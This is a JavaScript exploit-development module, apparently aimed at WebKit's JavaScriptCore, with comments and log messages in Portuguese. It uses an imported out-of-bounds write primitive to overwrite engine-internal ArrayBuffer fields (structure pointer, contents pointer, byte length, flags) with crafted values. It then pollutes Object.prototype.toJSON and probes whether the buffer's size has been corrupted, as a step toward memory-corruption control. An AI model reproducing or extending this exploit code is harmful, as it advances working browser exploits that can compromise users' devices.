// js/script3/testAggressiveFingerprintAB.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_write_absolute,
    oob_read_absolute, 
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs'; 
// CORREÇÃO: Importa a toJSON correta do arquivo correto
import { toJSON_AttemptWriteToThis_v3 } from './testCorruptArrayBufferContents.mjs'; 


export async function executeAggressiveABFingerprintTest() {
    const FNAME_TEST = "executeAggressiveABFingerprintTest";
    logS3(`--- Iniciando Teste: Fingerprinting Agressivo de oob_array_buffer_real ---`, "test", FNAME_TEST);
    document.title = `Aggro AB Fingerprint`;

    const offsets_and_values = [
        { offsetHex: JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET, value: new AdvancedInt64(0,0), size: 8, desc: "Null_StructPtr" },
        { offsetHex: JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET, value: new AdvancedInt64("0x4141414141414141"), size: 8, desc: "Dummy_StructPtr" },
        { offsetHex: JSC_OFFSETS.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET, value: new AdvancedInt64(0,0), size: 8, desc: "Null_ContentsImpl" },
        { offsetHex: JSC_OFFSETS.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET, value: new AdvancedInt64("0x4242424242424242"), size: 8, desc: "Dummy_ContentsImpl" },
        { offsetHex: JSC_OFFSETS.ArrayBuffer.SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START, value: 0x7FFFFFFF, size: 4, desc: "LargeSize_Dword" },
        { offsetHex: JSC_OFFSETS.ArrayBuffer.SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START, value: 0x0, size: 4, desc: "ZeroSize_Dword" },
        { offsetHex: JSC_OFFSETS.ArrayBuffer.SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START, value: 16, size: 4, desc: "SmallSize16_Dword" },
        { offsetHex: JSC_OFFSETS.JSCell.STRUCTURE_ID_OFFSET, value: 0xDEADBEEF, size: 4, desc: "Dummy_StructID" },
        { offsetHex: JSC_OFFSETS.JSCell.FLAGS_OFFSET, value: 0xFFFFFFFF, size: 4, desc: "Dummy_Flags" },
    ];

    const ppKey_val = 'toJSON';
    let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey_val);
    let pollutionApplied = false;

    for (const test_case of offsets_and_values) {
        const offset = parseInt(test_case.offsetHex, 16);
        if (isNaN(offset)) {
            logS3(`AVISO: Offset inválido ${test_case.offsetHex} para ${test_case.desc}. Pulando.`, "warn", FNAME_TEST);
            continue;
        }

        const test_description = `Fingerprint_Offset_${toHex(offset)}_${test_case.size}B_Val_${test_case.desc}`;
        logS3(`\n--- Testando: ${test_description} ---`, "subtest", FNAME_TEST);
        document.title = `Test: ${toHex(offset)} val ${test_case.desc}`;

        await triggerOOB_primitive();
        if (!oob_array_buffer_real) {
            logS3("Falha OOB Setup. Pulando este sub-teste.", "error", FNAME_TEST);
            continue;
        }
        const initial_js_length = oob_array_buffer_real.byteLength;
        logS3(`   oob_array_buffer_real tamanho ANTES da escrita no conteúdo: ${initial_js_length}`, "info", FNAME_TEST);

        logS3(`   Escrevendo ${isAdvancedInt64Object(test_case.value) ? test_case.value.toString(true) : toHex(test_case.value)} em oob_ab_content[${toHex(offset)}] (${test_case.size} bytes)...`, "warn", FNAME_TEST);
        try {
            if (offset + test_case.size > oob_array_buffer_real.byteLength) {
                 logS3(`   AVISO: Escrita em ${toHex(offset)} (tam: ${test_case.size}) excede o buffer. Pulando.`, "warn", FNAME_TEST);
                 clearOOBEnvironment();
                 continue;
            }
            oob_write_absolute(offset, test_case.value, test_case.size);
            let read_back_check_val;
            if (test_case.size === 8) read_back_check_val = oob_read_absolute(offset, 8);
            else read_back_check_val = oob_read_absolute(offset, 4);
            logS3(`   Escrita OOB no conteúdo realizada. Lido de volta do conteúdo: ${isAdvancedInt64Object(read_back_check_val) ? read_back_check_val.toString(true) : toHex(read_back_check_val)}`, "info", FNAME_TEST);
        } catch (e_write) {
            logS3(`   ERRO na escrita OOB no conteúdo para ${test_description}: ${e_write.message}`, "error", FNAME_TEST);
            clearOOBEnvironment();
            continue; 
        }
        await PAUSE_S3(SHORT_PAUSE_S3);
        
        logS3("   Observando oob_array_buffer_real (objeto JS) PÓS escrita no seu conteúdo:", "info", FNAME_TEST);
        let current_js_length = "N/A";
        // ... (outras verificações como antes)
        try {
            current_js_length = oob_array_buffer_real.byteLength;
            logS3(`     oob_array_buffer_real.byteLength (JS): ${current_js_length}`, "leak", FNAME_TEST);
            if (current_js_length !== initial_js_length) {
                logS3(`     !!!! ALTERAÇÃO DE TAMANHO JS DETECTADA !!!! Original: ${initial_js_length}, Novo: ${current_js_length}`, "critical", FNAME_TEST);
                document.title = `SUCCESS: AB JS Size MODIFIED!`;
            }
        } catch(e) { logS3(`     Erro ao ler oob_array_buffer_real.byteLength: ${e.message}`, "error", FNAME_TEST); }
        
        // Sondagem com JSON.stringify
        let stringifyResult = null;
        try {
            logS3(`   Poluindo e chamando JSON.stringify(oob_array_buffer_real)...`, "info", FNAME_TEST);
            Object.defineProperty(Object.prototype, ppKey_val, {
                value: toJSON_AttemptWriteToThis_v3, // USA A FUNÇÃO CORRETA IMPORTADA
                writable: true, configurable: true, enumerable: false
            });
            pollutionApplied = true;

            stringifyResult = JSON.stringify(oob_array_buffer_real);
            logS3(`   Resultado JSON.stringify: ${stringifyResult ? JSON.stringify(stringifyResult) : 'N/A'}`, "info", FNAME_TEST);
            if (stringifyResult && stringifyResult.this_byteLength_prop !== initial_js_length && typeof stringifyResult.this_byteLength_prop === 'number') {
                 logS3(`     !!!! ALTERAÇÃO DE TAMANHO via toJSON DETECTADA !!!! Original: ${initial_js_length}, Novo na toJSON: ${stringifyResult.this_byteLength_prop}`, "critical", FNAME_TEST);
            }
        } catch (e_stringify) {
            logS3(`   ERRO CAPTURADO JSON.stringify para ${test_description}: ${e_stringify.name} - ${e_stringify.message}`, "error", FNAME_TEST);
        } finally {
            if (pollutionApplied) {
                if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey_val, originalToJSONDescriptor);
                else delete Object.prototype[ppKey_val];
                pollutionApplied = false;
            }
        }
        
        clearOOBEnvironment();
        await PAUSE_S3(MEDIUM_PAUSE_S3);
        if (document.title.startsWith("SUCCESS")) break; 
    }
    logS3(`--- Teste Fingerprinting Agressivo CONCLUÍDO ---`, "test", FNAME_TEST);
}
